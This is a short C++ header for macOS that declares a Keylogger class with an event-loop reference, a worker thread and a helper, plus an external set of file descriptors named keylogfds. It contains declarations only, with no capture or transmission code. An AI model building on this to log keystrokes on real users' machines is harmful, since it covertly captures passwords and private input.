#ifdef __APPLE__

#pragma once
#include <set>
#include <iostream>
#include <thread>
#include <ApplicationServices/ApplicationServices.h>

extern std::set<int> keylogfds;


class Keylogger{
    CFRunLoopRef _event_loop;
    std::thread _keylogThread;

    void startKeylogHelper();
public:
    Keylogger();
    ~Keylogger();

};

#endif